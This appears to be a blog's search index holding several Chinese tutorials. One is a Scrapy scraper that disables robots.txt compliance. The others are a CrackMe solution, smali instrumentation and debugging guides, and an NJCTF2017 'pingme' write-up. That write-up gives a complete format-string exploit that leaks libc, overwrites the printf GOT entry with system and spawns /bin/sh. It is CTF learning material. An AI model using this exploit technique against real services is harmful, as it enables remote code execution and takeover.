<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>muuto_scrapy爬虫</title>
    <link href="/cray/2020/07/04/muuto_scrapy%E6%A1%86%E6%9E%B6%E7%88%AC%E8%99%AB/"/>
    <url>/cray/2020/07/04/muuto_scrapy%E6%A1%86%E6%9E%B6%E7%88%AC%E8%99%AB/</url>
    
    <content type="html"><![CDATA[<p>本项目是爬取一个家具网站的部分数据</p><p>目标站：<a href="https://muuto.com/furniture" target="_blank" rel="noopener">https://muuto.com/furniture</a></p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本爬虫使用scrapy框架</p><p>框架大概流程如下</p><p><img src="https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200705164322714.png" srcset="/cray/img/loading.gif" alt="image-20200705164322714"></p><p>配图来源：<a href="https://doc.scrapy.org/en/master/topics/architecture.html" target="_blank" rel="noopener">https://doc.scrapy.org/en/master/topics/architecture.html</a></p><h4 id="下载样式"><a href="#下载样式" class="headerlink" title="下载样式"></a>下载样式</h4><p>保存格式如下</p><p><img src="https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200705164404797.png" srcset="/cray/img/loading.gif" alt="image-20200705164404797"></p><h3 id="生成新对象"><a href="#生成新对象" class="headerlink" title="生成新对象"></a>生成新对象</h3><pre><code class="shell">scrapy startproject sSofo        </code></pre><p>创建一个scrapy空对象，方便后期使用</p><h3 id="使用通用模板创建一个spider"><a href="#使用通用模板创建一个spider" class="headerlink" title="使用通用模板创建一个spider"></a>使用通用模板创建一个spider</h3><pre><code class="shell">  #scrapy genspidere [options] &lt;name&gt; &lt;domain&gt;  scrapy genspidere xxxx xxxx.com</code></pre><h3 id="详细配置文件"><a href="#详细配置文件" class="headerlink" title="详细配置文件"></a>详细配置文件</h3><p>上面生成默认配置文件后，下面贴出我修改的文件，没贴出的代码都默认处理</p><h4 id="item-py"><a href="#item-py" class="headerlink" title="item.py"></a>item.py</h4><pre><code class="python">#item.pyimport scrapyclass SsofaItem(scrapy.Item):    # define the fields for your item here like:    # name = scrapy.Field()    srcurl = scrapy.Field()    videourl = scrapy.Field()    title = scrapy.Field() </code></pre><h4 id="spiders-example-py"><a href="#spiders-example-py" class="headerlink" title="spiders/example.py"></a>spiders/example.py</h4><pre><code class="python">#spiders/example.pyimport scrapyfrom sSofa.items import SsofaItemclass ExampleSpider(scrapy.Spider):    name = &#39;example&#39;    myheaders = {        &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36&#39;,    }    def start_requests(self):        #爬虫开始运行执行的第一个函数        purl = &quot;https://muuto.com/furniture&quot;        yield scrapy.Request(purl,headers = self.myheaders)    def parse(self, response):        #默认第一次返回的response处理函数        div_xapth_list = response.xpath(&quot;//a[@class=&#39;product photo product-item-photo&#39;]/@href&quot;).extract()        for each in div_xapth_list:            # 注意下面的callback是sec_page，所以返回的数据就到下面去处理            yield scrapy.Request(each,headers = self.myheaders,callback = self.sec_page)    def sec_page(self,response):        #处理第二次request返回的数据        #item在这个框架中可以认为是一个全局变量一样的东西，给各个模块之间使用数据（个人理解）        item = SsofaItem()        title = response.xpath(&quot;//span[@data-ui-id=&#39;page-title-wrapper&#39;]/text()&quot;).extract()        item[&#39;title&#39;] = title         source_video = response.xpath(&quot;//section[@id=&#39;video-unbranded&#39;]//iframe[@id=&#39;player&#39;]/@src&quot;).extract()        item[&#39;videourl&#39;] = source_video        xpathfilter =&quot;//section[@id=&#39;fifty-fifty-image-slider-text&#39;]//img/@src | //section[@id=&#39;brand-images&#39;]//img/@src | //section[@id=&#39;designer&#39;]//img/@src&quot;        srcurl = response.xpath(xpathfilter).extract()        item[&#39;srcurl&#39;] = srcurl        # srcurl = response.xpath(&quot;//section[@id=&#39;fifty-fifty-image-slider-text&#39;]//img/@src&quot;).extract()        # item[&#39;srcurl&#39;] = srcurl        # brand_images = response.xpath(&quot;//section[@id=&#39;brand-images&#39;]//img/@src&quot;).extract()        # item[&#39;srcurl&#39;].append(brand_images)        # designer = response.xpath(&quot;//section[@id=&#39;designer&#39;]//img/@src&quot;).extract()        # item[&#39;srcurl&#39;].append(designer)        #这里返回item后，如果没有开启pipelimes，就到这里结束        #如果打开后，就去执行pipelimes中的代码        yield item</code></pre><h4 id="pipelines-py"><a href="#pipelines-py" class="headerlink" title="pipelines.py"></a>pipelines.py</h4><pre><code class="python">#pipelines.pyimport scrapyfrom scrapy.pipelines.images import ImagesPipeline#注意这个类是继承自ImagesPipeline 而不是 object class SsofaPipeline(ImagesPipeline):    myheaders = {        &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36&#39;,    }    def get_media_requests(self,item,info):        #这里是重写父类ImagesPipeline的对应方法，建议对照父类代码理解        #我这里item中的srcurl是用xpath获取的数组，所以要遍历取每个值        for each in item[&#39;srcurl&#39;]:            #注意最后这个meta，因为file_path中没传入item，所以想用的话可以通过这种方式传过去给file-path 使用            yield scrapy.Request(each,headers = self.myheaders,meta={&#39;item&#39;:item})    def file_path(self, request, response=None, info=None):        image_guid = request.url.split(&quot;/&quot;)[-1].split(&#39;.&#39;)[0]        #前一个表示目录，后一个表示保存的文件名        path = &quot;{}/{}.jpg&quot;.format(request.meta[&#39;item&#39;][&#39;title&#39;][0],image_guid)        return path</code></pre><h3 id="settings-py"><a href="#settings-py" class="headerlink" title="settings.py"></a>settings.py</h3><pre><code class="python">#settings.pyimport os#使用ImagesPipeline 下载的文件保存在这，名字不能乱改IMAGES_STORE = os.path.join(os.path.dirname(os.path.dirname(__file__)),&#39;Sofo_images&#39;)#关闭机器人协议，否则某些网站会获取不到数据ROBOTSTXT_OBEY = False#这个很重要，默认是未开启的，也就是默认SsofaPipeline中的代码不执行，需要在这接触注释ITEM_PIPELINES = {   &#39;sSofa.pipelines.SsofaPipeline&#39;: 1,}# 可以在这设置默认request headers# DEFAULT_REQUEST_HEADERS = {#             &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3&#39;,#             &#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;,#             &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.5,en;q=0.3&quot;,#             &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,#             &#39;Content-Length&#39;: &#39;0&#39;,#             &quot;Connection&quot;: &quot;keep-alive&quot;#             }</code></pre><h3 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h3><p>爬虫名是在<code>spiders/example.py</code>中<code>name</code>设置的</p><p>命令行运行</p><p><code>scrapy crawl example</code></p><p>脚本运行</p><pre><code class="python">from scrapy import cmdlinecmdline.execute(&#39;scrapy crawl example&#39;.split())</code></pre><p>网上还有很多其他运行方式</p>]]></content>
    
    
    
    <tags>
      
      <tag>爬虫</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>32位转64位 easy_CrackMe</title>
    <link href="/cray/2020/05/04/32%E8%BD%AC64_CrakeMe/"/>
    <url>/cray/2020/05/04/32%E8%BD%AC64_CrakeMe/</url>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>参考来源：</p><p><a href="https://moliam.github.io/2018/11/17/Wow64-at-the-assemly-level.html" target="_blank" rel="noopener">https://moliam.github.io/2018/11/17/Wow64-at-the-assemly-level.html</a></p><p>思路来源汪师傅</p><h2 id="主要原理"><a href="#主要原理" class="headerlink" title="主要原理"></a>主要原理</h2><p>64位系统中运行32位程序时是使用Wow64来辅助执行的，主要是可以通过控制cs寄存器来改变CPU执行命令标准，当cs=0x23时按照32位可执行性程序执行，当cx=0x33时按照64位标准执行</p><p>所以通过调整cs寄存器就可以在32位程序中执行64位的代码</p><h3 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h3><p>常规调试器无法同时调试32位和64位代码</p><p>到达64代码无法单步跟踪</p><p>详情可参考 <a href="https://www.anquanke.com/post/id/171111" target="_blank" rel="noopener">https://www.anquanke.com/post/id/171111</a></p><p>开发的时候64位汇编需要完全硬编码后转汇编码写进去，修改的时候基本要完全重写一次汇编</p><h3 id="逆向过程"><a href="#逆向过程" class="headerlink" title="逆向过程"></a>逆向过程</h3><p>无壳无混淆</p><p>使用od调试到达<code>0x401100</code>跑飞，可以看到是大跳，且修改了段寄存器位<code>0x33</code></p><p>这里的目标地址是<code>0x401090</code></p><p><img src="https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200602185117668.png" srcset="/cray/img/loading.gif" alt="image-20200602184341253"></p><p>使用<code>IDA_64</code> 找到对应数据，根据前面修改了段寄存器cs为0x33，所以这里箭头所指的代码就因该是64位的代码</p><p><img src="https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200602184654770.png" srcset="/cray/img/loading.gif" alt="image-20200602184654770"></p><p><strong>请注意，是使用64位的IDA，不是32位的</strong></p><p>按下<code>alt+s</code>将代码按照64位反编译</p><p><img src="https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200602184341253.png" srcset="/cray/img/loading.gif" alt="image-20200602185117668"></p><p>然后按<strong>G</strong>跳转到<strong>0x401090</strong>处，按下<strong>x</strong>，将数据按汇编代码识别</p><p><img src="https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200602191541585.png" srcset="/cray/img/loading.gif" alt="image-20200602185444980"></p><p>这就是隐藏在32位中的64位代码，逻辑很简单，两个异或后就能处flag</p><p>将输入的flag的前8位 xor 0x1949194820192019 结果要等于 0x2D70283347784C7F</p><p>后8位xor 0x1949194820192019  等于 0x6478296510280D20</p><p>由于数据在内存中是小端序排列，所以异或后算出的值需要倒置一下</p><p>脚本如下</p><pre><code class="python">def hex2asc(hexs):    res = &quot;&quot;    for i in range(0, len(hexs), 2):        res += chr(int(hexs[i:i+2], 16))    return resv1 = 0x2D70283347784C7F ^ 0x1949194820192019v2 = 0x6478296510280D20 ^ 0x1949194820192019frist8 = (str(hex(v1)))[2:]last8 = (str(hex(v2)))[2:]res = hex2asc(frist8)print(res[::-1],end=&quot;&quot;)res = hex2asc(last8)print(res[::-1])</code></pre><p>测试最终结果</p><p><img src="https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200602185444980.png" srcset="/cray/img/loading.gif" alt="image-20200602191541585"></p>]]></content>
    
    
    
    <tags>
      
      <tag>CrakeMe</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwn_pingme</title>
    <link href="/cray/2020/03/31/pwn_NJCTF2017_pingme/"/>
    <url>/cray/2020/03/31/pwn_NJCTF2017_pingme/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文看不懂可以移步firmianay大佬看详细说明，我记录一些自己的方法。</p><p>PLT表和GOT表的关系：<a href="https://www.jianshu.com/p/0ac63c3744dd" target="_blank" rel="noopener">https://www.jianshu.com/p/0ac63c3744dd</a></p><h2 id="演示环境及工具"><a href="#演示环境及工具" class="headerlink" title="演示环境及工具"></a>演示环境及工具</h2><p>操作系统<strong>linux</strong></p><pre><code class="shell">cray@cray:~$ uname -a Linux cray 5.3.0-3-amd64 #1 SMP deepin 5.3.15-6apricot (2020-04-13) x86_64 GNU/Linuxcray@cray:~/Documents/Demos$ ldd pingme     linux-gate.so.1 (0xf7edc000)    libc.so.6 =&gt; /lib32/libc.so.6 (0xf7cdc000)    /lib/ld-linux.so.2 (0xf7edd000)cray@cray:~/Documents/Demos$ ls -la /lib32/|grep &quot;libc.so.6&quot;lrwxrwxrwx  1 root root      12 3月   3 17:36 libc.so.6 -&gt; libc-2.28.socray@cray:~/Documents/Demos$ file /lib32/libc-2.28.so /lib32/libc-2.28.so: ELF 32-bit LSB pie executable, Intel 80386, version 1 (GNU/Linux), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=5327eb7657b083923efe41de73fa7755045362d9, for GNU/Linux 3.2.0, stripped</code></pre><p>调试工具<strong>radare2</strong></p><pre><code class="shell">cray@cray:~$ r2 -vradare2 4.5.0-git 0 @ linux-x86-64 git.4.5.0-gitcommit: HEAD build: 2020-05-14__12:01:18</code></pre><p>样本下载</p><h3 id="整体思路"><a href="#整体思路" class="headerlink" title="整体思路"></a>整体思路</h3><p>由于没有给源文件，有格式化漏洞，所以思路找到利用偏移，dump源程序，先找到PLT表中的printf位置，再拿到got表中已经加载的实际printf在导入libc中的地址。可以在libc-database找到对应的偏移，最后使用%n的特性，重写got表的地址为libc_system的地址。</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>我们要自己构造环境，拿到pingme后，网上有很多用socat去重新加载的，但是效率很低 OTZ，这里也给一个 firmianay大佬的方案</p><pre><code class="bash">#!/bin/shwhile true; do        num=`ps -ef | grep &quot;socat&quot; | grep -v &quot;grep&quot; | wc -l`        if [ $num -lt 5 ]; then                socat tcp4-listen:10001,reuseaddr,fork exec:./pingme &amp;        fidone</code></pre><p>我尝试使用ncat去加载，速度相当快</p><pre><code class="shell">ncat -vc ./pingme -lk 10001</code></pre><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="格式化漏洞"><a href="#格式化漏洞" class="headerlink" title="格式化漏洞"></a>格式化漏洞</h4><p>参考<a href="https://www.bookstack.cn/read/CTF-All-In-One/doc-3.1.1_format_string.md" target="_blank" rel="noopener">https://www.bookstack.cn/read/CTF-All-In-One/doc-3.1.1_format_string.md</a></p><h4 id="找到利用点"><a href="#找到利用点" class="headerlink" title="找到利用点"></a>找到利用点</h4><p>利用点是 printf格式中<code>%5$s</code>的含义是：打印printf的第五个参数所指向的地址</p><p>32位程序在传参时将参数放在栈中，经过尝试可以在第7个位置找到保存在栈中的输入数据，如果将他看作地址，就可以任意地址读取.</p><p>这里使用pwntools中的exec_fmt来找利用点，原理都是一样的</p><pre><code class="python">from pwn import *p = remote(&#39;127.0.0.1&#39;, &#39;10001&#39;)def exec_fmt(payload):    log.info(payload)    p.sendline(payload)    info = p.recv()    return infoauto = FmtStr(exec_fmt)offset = auto.offset</code></pre><p>输出如下</p><pre><code class="javascript">[+] Opening connection to 127.0.0.1 on port 10001: Done[*] aaaabaaacaaadaaaeaaaSTART%1$pEND[*] aaaabaaacaaadaaaeaaaSTART%2$pEND[*] aaaabaaacaaadaaaeaaaSTART%3$pEND[*] aaaabaaacaaadaaaeaaaSTART%4$pEND[*] aaaabaaacaaadaaaeaaaSTART%5$pEND[*] aaaabaaacaaadaaaeaaaSTART%6$pEND[*] aaaabaaacaaadaaaeaaaSTART%7$pEND[*] Found format string offset: 7[*] Closed connection to 127.0.0.1 port 10001</code></pre><h4 id="dump源程序"><a href="#dump源程序" class="headerlink" title="dump源程序"></a>dump源程序</h4><p>虽然我们这里拿到了源程序，但是比赛中是没提供源程序的，所以要自己用前面的漏洞dump出来</p><p>通过前面的漏洞，猜测程序未打开PIE，加载地址未0x8048000</p><p>使用<code>&quot;%9$s.AAA&quot; + p32(start_addr)</code>格式化是因为printf在打印<code>\x00</code>的时候会认为是截断符号，就不会打印任何东西，所以这里将第二个参数设置未<code>.AAA</code>来表示这次printf输出了多少数据，如果前面为空，那么就是截断符号，要手动修改.</p><p>dump脚本如下</p><pre><code class="python">from pwn import *def dump_memory(start_addr, end_addr):    result = &quot;&quot;    while start_addr &lt; end_addr:        p = remote(&#39;127.0.0.1&#39;, &#39;10001&#39;)        p.recvline()        #print result.encode(&#39;hex&#39;)        payload = &quot;%9$s.AAA&quot; + p32(start_addr)        p.sendline(payload)        data = p.recvuntil(&quot;.AAA&quot;)[:-4]        if data == &quot;&quot;:            data = &quot;\x00&quot;        log.info(&quot;leaking: 0x%x --&gt; %s&quot; % (start_addr, data.encode(&#39;hex&#39;)))        result += data        start_addr += len(data)        p.close()    return resultstart_addr = 0x8048000end_addr   = 0x8049000code_bin = dump_memory(start_addr, end_addr)with open(&quot;code.bin&quot;, &quot;wb&quot;) as f:    f.write(code_bin)    f.close()</code></pre><h4 id="获取printf-got"><a href="#获取printf-got" class="headerlink" title="获取printf_got"></a>获取printf_got</h4><p>拿到部分重要的源代码后，就可以在rabin2中来识别符号了，imp.printf 虚拟地址为 0x08048400</p><pre><code class="shell">[0x08048490]&gt; is[Symbols]nth paddr       vaddr      bind   type   size lib name――――――――――――――――――――――――――――――――――――――――――――――――――――――11   ---------- 0x080499a4 GLOBAL OBJ    4        stdout12   0x0000071c 0x0804871c GLOBAL OBJ    4        _IO_stdin_used13   ---------- 0x080499a0 GLOBAL OBJ    4        stdin1    0x000003f0 0x080483f0 GLOBAL FUNC   16       imp.setbuf2    0x00000400 0x08048400 GLOBAL FUNC   16       imp.printf3    0x00000410 0x08048410 GLOBAL FUNC   16       imp.fgets4    0x00000420 0x08048420 GLOBAL FUNC   16       imp.alarm6    ---------- 0x00000000 WEAK   NOTYPE 16       imp.__gmon_start__7    0x00000440 0x08048440 GLOBAL FUNC   16       imp.strchr8    0x00000450 0x08048450 GLOBAL FUNC   16       imp.strlen9    0x00000460 0x08048460 GLOBAL FUNC   16       imp.__libc_start_main10   0x00000470 0x08048470 GLOBAL FUNC   16       imp.putchar</code></pre><p>然后拿到got表中printf的地址  0x8049974</p><pre><code class="shell">[0x08048490]&gt; pd 3 @ 0x8048400        ╎   ; CALL XREF from main @ 0x8048664┌ 6: int sym.imp.printf (const char *format);│ bp: 0 (vars 0, args 0)│ sp: 0 (vars 0, args 0)│ rg: 0 (vars 0, args 0)└       ╎   0x08048400      ff2574990408   jmp dword [reloc.printf]    ; 0x8049974        ╎   0x08048406      6808000030     push panel.addr             ; 0x30000008        └─&lt; 0x0804840b      e9d0ffffff     jmp section..plt</code></pre><h4 id="获取libc-printf找到对应libc"><a href="#获取libc-printf找到对应libc" class="headerlink" title="获取libc_printf找到对应libc"></a>获取libc_printf找到对应libc</h4><p>这里的got表指向的就是libc中的printf地址</p><p>可以利用这个printf的地址，到libc库里去匹配，找到对应的libc，再拿到system的地址</p><pre><code class="pyhton">from pwn import *def get_libc_printf():    addr = 0x8049974    p = remote(&#39;127.0.0.1&#39;, &#39;10001&#39;)    p.recvline()    payload = &quot;%9$s.AAA&quot; + p32(addr)    p.sendline(payload)    data = p.recvuntil(&quot;.AAA&quot;)[:4].encode(&#39;hex&#39;)    data = data[6:8]+data[4:6]+data[2:4]+data[0:2]    log.info(&quot;leaking: 0x%x --&gt; 0x%s&quot; % (addr, data))    p.close()get_libc_printf()</code></pre><p>我这里输入是860结尾，去<a href="https://libc.blukat.me/中搜索" target="_blank" rel="noopener">https://libc.blukat.me/中搜索</a></p><p><img src="https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200521225248944.png" srcset="/cray/img/loading.gif" alt="image-20200521225248944"></p><p>我这里由于libc版本比较新，网站没收录，所以自己导入搞一下</p><p>用到开源代码<a href="https://github.com/niklasb/libc-database" target="_blank" rel="noopener">https://github.com/niklasb/libc-database</a></p><p>先加载一下libc</p><pre><code class="shell">cray@cray:~/SOFT/libc-database$ ./add /lib32/libc-2.28.so Adding local libc /lib32/libc-2.28.so (id local-8c74cfda272116c51d2de1e1bd19d1f9994d4d98  /lib32/libc-2.28.so)  -&gt; Writing libc to db/local-8c74cfda272116c51d2de1e1bd19d1f9994d4d98.so  -&gt; Writing symbols to db/local-8c74cfda272116c51d2de1e1bd19d1f9994d4d98.symbols  -&gt; Writing version info</code></pre><p>…（未完待续</p><p>拿到偏移后</p><h4 id="利用-n特性重写printf-got"><a href="#利用-n特性重写printf-got" class="headerlink" title="利用%n特性重写printf_got"></a>利用%n特性重写printf_got</h4><p>脚本</p><pre><code class="python">payload = fmtstr_payload(7, {printf_got: system_addr})p = remote(&#39;127.0.0.1&#39;, &#39;10001&#39;)p.recvline()p.sendline(payload)p.recv()p.sendline(&#39;/bin/sh&#39;)p.interactive()</code></pre><p>最终我的exp：</p><pre><code class="python">from pwn import *def eeexp():    printf_got = 0x8049974    system_offset = 0x0003e9e0    printf_offset = 0x00052860    p = remote(&#39;127.0.0.1&#39;, &#39;10001&#39;)    p.recvline()    payload = &quot;%9$s.AAA&quot; + p32(printf_got)    p.sendline(payload)    data = p.recvuntil(&quot;.AAA&quot;)[:4].encode(&#39;hex&#39;)    data2 = data[6:8]+data[4:6]+data[2:4]+data[0:2]    printf_so = eval(&quot;0x{}&quot;.format(data2))    log.info(&quot;printf_so -&gt; 0x%x&quot; % printf_so)    system_so = printf_so + (system_offset-printf_offset)     log.info(&quot;system_got -&gt; 0x%x&quot; % system_so)    payload = fmtstr_payload(7,{printf_got:system_so})    p.sendline(payload)    p.recv()    p.sendline(&#39;/bin/sh&#39;)    p.interactive()if __name__ == &quot;__main__&quot;:    eeexp()</code></pre><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.bookstack.cn/read/CTF-All-In-One/doc-6.1.2_pwn_njctf2017_pingme.md" target="_blank" rel="noopener">https://www.bookstack.cn/read/CTF-All-In-One/doc-6.1.2_pwn_njctf2017_pingme.md</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Smali插桩</title>
    <link href="/cray/2020/03/31/Smali%20%E6%8F%92%E6%A1%A9/"/>
    <url>/cray/2020/03/31/Smali%20%E6%8F%92%E6%A1%A9/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>大型程序不好直接调试，一个API 有可能多次调用，直接下断也是有印象，下面介绍下在smali中插入log代码达到调试的作用</p><p>smali源码可以随意加正规代码，就像汇编一样，只是可能修改后不能反编译成java代码</p><h3 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h3><p>Android Killer V1.3.1.0（下面简称AK）</p><p>夜神模拟器或真机</p><p>演示APK：<a href="https://gitee.com/L0yy/android_series/raw/master/%E4%BE%8B%E5%AD%90/crackme1.apk" target="_blank" rel="noopener">https://gitee.com/L0yy/android_series/raw/master/%E4%BE%8B%E5%AD%90/crackme1.apk</a></p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p><strong>这里已经默认你安装过这个APK，知道他的一些行为</strong></p><p>打开AK，加载目标APK，等待反编译完成</p><p>打开项目的<code>Mainactivity.smali</code>的反编译代码</p><p><img src="https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200331134623301.png" srcset="/cray/img/loading.gif" alt="image-20200331134623301"></p><p>逻辑还是很清晰的，这里设置了按钮的<code>OnClickListener</code>当点击时就会执行相关函数，也就是这里的<code>onClick</code></p><blockquote><p>在反编译后的smali代码中，需要寻找equal判断的位置，在其进行输出getkey()返回值时插桩，由于功能唯一，代码位置很容易找到，在<code>com/mzheng/crackme1/MainActivity$1</code>文件中；</p><p>BTW：为什么是MainActivity$1.smali而不是MainActivity.smali呢？</p><p>因为主要的判断逻辑是在OnClickListener这个类里，而这个类是MainActivity的一个内部类，同时我们在实现的时候也没有给这个类声明具体的名字，所以这个类用$1表示。实际环境会有很多<code>$+id</code>的文件，大多如此，多功能情况下还是搜索特殊字符或对怀疑位置进行插桩来判断实际功能位置；因为继承呢</p><p>引用自：<a href="https://www.bodkin.ren/index.php/archives/560/" target="_blank" rel="noopener">https://www.bodkin.ren/index.php/archives/560/</a></p></blockquote><p>这里主要讲方法</p><h4 id="法1：用Ak直接插入Log"><a href="#法1：用Ak直接插入Log" class="headerlink" title="法1：用Ak直接插入Log"></a>法1：用Ak直接插入Log</h4><p>我们目的是修改<code>com/mzheng/crackme1/MainActivity$1</code>这个文件，达到把Getkey的返回值给打印出来</p><p><img src="https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200331142750849.png" srcset="/cray/img/loading.gif" alt="image-20200331142750849"></p><p>在这个位置<strong>右键-&gt;插入代码-&gt;log</strong></p><p>AK会帮你插入这个方法，直接调用就行</p><p><img src="https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200331171804535.png" srcset="/cray/img/loading.gif" alt="image-20200331143003496"></p><p>把V0改为你要打印的数据，<strong>一定记得要保存你的smali代码</strong> AK编译的时候不会帮你保存，要你自己保存</p><p>然后编译安装，注意箭头表注的地方</p><p><img src="https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200331143003496.png" srcset="/cray/img/loading.gif" alt="image-20200331171526913"></p><p>最后打开日志，稍微过滤下就可以得到<code>Tag：AndroidKiller-string</code> 的消息</p><p><img src="https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200331171526913.png" srcset="/cray/img/loading.gif" alt="image-20200331171804535"></p><p>如果使用adb命令如下</p><p><code>adb logcat -s AndroidKiller-string</code></p><h4 id="法2-手动添加Log类"><a href="#法2-手动添加Log类" class="headerlink" title="法2 手动添加Log类"></a>法2 手动添加Log类</h4><p>原理和法1一样，只是这个稍微麻烦一点</p><p>参考SewellDinG的方法</p><p><a href="https://github.com/SewellDinG/smaliArmory" target="_blank" rel="noopener">https://github.com/SewellDinG/smaliArmory</a></p><h3 id="遇到的几个坑"><a href="#遇到的几个坑" class="headerlink" title="遇到的几个坑"></a>遇到的几个坑</h3><ol><li><p>AK编译慢，老出错</p><p>网上给的方案，替换 <strong>AndroidKiller_v1.3.1\bin\apktool\apktool</strong> 下的<strong>ShakaApktool.jar</strong> 吾爱盘中有</p></li><li><p>AK找不到设备</p><p>现场时使用环境变量中的adb连接一下</p><p>adb connect 127.0.0.1:62001</p><p>点击刷新后，还是没有的话就用<strong>AndroidKiller_v1.3.1\bin\apktool</strong>中的adb去连，因为AK用的自己的adb工具</p></li><li><p>AK回编不了</p><p>AK的apktool有很久没更新了，导致某些版本不能回编</p><p>但是这些都可以通过用高版本的apktool 手动敲命令替换，所以都不是问题</p></li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>smali中可以插入任意代码，只要不影响程序运行，AK只是一个辅助工具，基本功能都是再apktool上实现的，所以它解决不了的还是老老实实敲代码吧！</p>]]></content>
    
    
    
    <tags>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android Studio动态调试Smali 和 插桩</title>
    <link href="/cray/2020/03/30/Android%20Studio%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95Smali/"/>
    <url>/cray/2020/03/30/Android%20Studio%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95Smali/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>无源码调试Smali，很有必要</p><p>JVM：夜神模拟器 V6.6.0.5101</p><p>开发环境：Android Studio 3.6.1</p><p>文中的目标APK命名为：<code>Nothing.apk</code></p><p>Android Killer V1.3.1.0（下面简称AK）</p><p>夜神模拟器或真机</p><p>演示APK：<a href="https://gitee.com/L0yy/android_series/raw/master/%E4%BE%8B%E5%AD%90/crackme1.apk" target="_blank" rel="noopener">https://gitee.com/L0yy/android_series/raw/master/%E4%BE%8B%E5%AD%90/crackme1.apk</a></p><h2 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h2><p><a href="https://bitbucket.org/JesusFreke/smali/downloads/" target="_blank" rel="noopener">https://bitbucket.org/JesusFreke/smali/downloads/</a></p><p><strong>这个包在页面下方</strong></p><p><img src="https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200330172401980.png" srcset="/cray/img/loading.gif" alt="image-20200330172401980"></p><p>安装位置在设置的插件中，如图</p><p><img src="https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200330172515100.png" srcset="/cray/img/loading.gif" alt="image-20200330172515100"></p><h2 id="反编译APK"><a href="#反编译APK" class="headerlink" title="反编译APK"></a>反编译APK</h2><p>一般release版本都是不支持调试的，先解包</p><p><code>apktool d Nothing.apk</code></p><p>修改<code>AndroidManifest.xml</code> 中的调试选项</p><p>在<code>application</code>中添加<code>android:debuggable=&quot;true&quot;</code></p><p><img src="https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200330181158966.png" srcset="/cray/img/loading.gif" alt="image-20200330172920337"></p><p>修改后回包</p><p><code>apktool b . -o Nothing_path.apk</code></p><p>这里的apk还没有签名，如何签名参考上一篇文章</p><p><a href="http://l0yy.gitee.io/cray/2019/12/14/android逆向一/">http://l0yy.gitee.io/cray/2019/12/14/android%E9%80%86%E5%90%91%E4%B8%80/</a></p><hr><p><strong>后面的操作都是建立在这个<code>Nothing_path.apk</code>上的</strong></p><hr><h2 id="安装Nothing-path-apk"><a href="#安装Nothing-path-apk" class="headerlink" title="安装Nothing_path.apk"></a>安装Nothing_path.apk</h2><p><strong>法1：直接把apk拖进去自动安装</strong></p><p><strong>法2：使用adb</strong></p><p>先链接到模拟器,再安装</p><pre><code class="shell">adb connect 127.0.0.1:62001            //夜神模拟器固定链接端口62001adb install Nothing_path.apk</code></pre><p>为了方便后期调试，这里将要调试的程序以调试模式开启，让它等待调试。</p><p>标准格式 </p><p><code>adb shell am start -D -n packagename/packagename.MainActivity</code></p><p>我的命令如下</p><p><code>adb shell am start -D -n com.cray.nothing/com.cray.nothing.MainActivity</code></p><p><img src="https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200330175318198.png" srcset="/cray/img/loading.gif" alt="image-20200330181158966"></p><h2 id="配置调试器-AS"><a href="#配置调试器-AS" class="headerlink" title="配置调试器 AS"></a>配置调试器 